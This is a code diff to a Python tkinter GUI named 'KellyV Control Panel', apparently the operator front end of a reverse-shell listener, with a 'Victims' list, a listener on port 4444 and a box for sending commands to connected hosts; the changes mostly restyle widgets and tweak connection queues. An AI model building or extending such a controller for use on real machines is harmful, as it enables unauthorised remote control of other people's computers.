@@ -6,11 +6,12 @@ import queue
 # initialization
 root = Tk()
 root.title("KellyV Control Panel")
-root.geometry("500x400")
 root.resizable(False, False)
+root.configure(bg='gray')
 q = queue.Queue()
 outputQ = queue.Queue()
 errorQ = queue.Queue()
+osQ = queue.Queue()
 listenMsgQ = queue.Queue()
 conQ = queue.Queue()
 commandList = []
@@ -24,6 +25,7 @@ heading5 = None
 # tkinter stuff
 class KellyV:
     def __init__(self, master):
+
 
 
         def sequence(*functions):
@@ -60,43 +62,44 @@ class KellyV:
 
             vcmd = (root.register(validate), '%P')
 
-            t_listen = lambda: threading.Thread(target=listen, args=(str(ip_thing.get()), int(port_thing.get()), int(limit_thing.get()), q, listenMsgQ, conQ)).start()
+            t_listen = lambda: threading.Thread(target=listen, args=(str(ip_thing.get()), int(port_thing.get()), int(limit_thing.get()), q, listenMsgQ, conQ, osQ)).start()
             #first
-            ip_text = Label(master, text="IP:")
+            ip_text = Label(master, text="IP:", bg="gray", fg="light gray")
             ip_text.pack()
             ip_text.place(x=30, y=10)
-            ip_thing = Entry(master)
+            ip_thing = Entry(master, bg="gray", fg="light gray")
             ip_thing.pack()
             ip_thing.place(x=30, y=30)
             ip_thing.insert(END, 'localhost')
 
             # second
-            port_text = Label(master, text="Port:")
+            port_text = Label(master, text="Port:", bg="gray", fg="light gray")
             port_text.pack()
             port_text.place(x=200, y=10)
 
-            port_thing = Entry(master, validate="key", validatecommand=vcmd)
+            port_thing = Entry(master, validate="key", validatecommand=vcmd, bg="gray", fg="light gray")
             port_thing.pack()
             port_thing.place(x=200, y=30)
             port_thing.insert(END, '4444')
 
             # limit
-            limit_text = Label(master, text="Limit:")
+            limit_text = Label(master, text="Limit:", bg="gray", fg="light gray")
             limit_text.pack()
             limit_text.place(x=27, y=55)
 
-            limit_thing = Entry(master, width=5)
+            limit_thing = Entry(master, width=5, bg="gray", fg="light gray")
             limit_thing.pack()
             limit_thing.place(x=30, y=75)
             limit_thing.insert(END, '1')
 
             # button
-            button_thing = Button(master, text="Create Listener", command=sequence(t_listen, defaultMenu))
+            button_thing = Button(master, text="Create Listener", command=sequence(t_listen, defaultMenu), bg="gray", fg="light gray")
             button_thing.pack()
             button_thing.place(x=200, y=75)
 
         def defaultMenu():
             global heading5
+
             def outputSender(*args):
                 global index
                 outputText.configure(state='normal')
@@ -106,8 +109,6 @@ class KellyV:
                 outputText.delete('1.0', 'end')
                 outputText.insert(END, str(outputQ.get()).replace('\\r', '\r').replace('\\n', '\n'))
                 outputText.configure(state='disabled')
-
-
 
             def commandListerUp():
                 global index
@@ -138,43 +139,43 @@ class KellyV:
             for widget in root.winfo_children():
                 widget.destroy()
             root.title("KellyV Control Panel")
-            root.geometry("500x400")
+            root.geometry("500x410")
             mainFrame = Frame(master)
             mainFrame.pack()
             # COMMAND HEADING
-            heading1 = Label(master, text="Command:")
+            heading1 = Label(master, text="Command:", bg="gray", fg="light gray")
             heading1.pack()
             heading1.place(x=30, y=350)
 
             # VICTIM HEADING
-            heading2 = Label(master, text="Victims")
+            heading2 = Label(master, text="Victims", bg="gray", fg="light gray")
             heading2.pack()
             heading2.place(x=350, y=15)
 
             # OUTPUT HEADING
-            heading3 = Label(master, text="Output")
+            heading3 = Label(master, text="Output", bg="gray", fg="light gray")
             heading3.pack()
             heading3.place(x=30, y=15)
 
             # LISTENER MESsAGE HEADING
-            heading4 = Label(master, text='')
+            heading4 = Label(master, text='', bg="gray", fg="light gray")
             heading4.pack()
             heading4.place(x=30, y=335)
 
-            heading5 = Label(master, text='')
+            heading5 = Label(master, text='', bg="gray", fg="light gray")
             heading5.pack()
             heading5.place(x=30, y=315)
 
             # OUTPUT TEXT
-            outputText = Text(master, width=38, height=17)
+            outputText = Text(master, width=38, height=17, bg="gray", fg="light gray")
             outputText.configure(state='disabled')
             outputText.pack()
-            outputText.place(x=35, y=35)
             outputText.config(wrap=WORD)
+            outputText.place(x=35, y=35)
 
             # COMMAND ENTRY
             global commandInput
-            commandInput = Entry(master, width=60)
+            commandInput = Entry(master, width=60, bg="gray", fg="light gray")
             root.bind('<Return>', sequence(t_sendcommand, outputSender))
             root.bind('<Up>', lambda x=None: commandListerUp())
             root.bind('<Down>', lambda x=None: commandListerDown())
@@ -182,13 +183,13 @@ class KellyV:
             commandInput.place(x=30, y=375)
 
             # EXECUTE BUTTON
-            executeButton = Button(master, text="Send", command=sequence(t_sendcommand, outputSender))
+            executeButton = Button(master, text="Send", command=sequence(t_sendcommand, outputSender), bg="gray", fg="light gray")
             executeButton.pack()
             executeButton.place(x=420, y=371)
 
 
             # EXECUTE BUTTON
-            listenButton = Button(master, text="Create Listener", command=lambda: createListener())
+            listenButton = Button(master, text="Create Listener", command=lambda: createListener(), bg="gray", fg="light gray")
             listenButton.pack()
             listenButton.place(x=400, y=340)
 
@@ -200,7 +201,8 @@ class KellyV:
 
         def onConnectionEST():
             conEST = True
-            victim, victim_address = q.get_nowait()
+            victim, victim_address = q.get()
+            q.put((victim, victim_address))
             heading5.config(text=f"Connection established with {victim_address}")
 
             for victim in victimList:
@@ -215,7 +217,6 @@ class KellyV:
             except queue.Empty:
                 pass
             root.after(1000, update)
-
 
         defaultMenu()
 
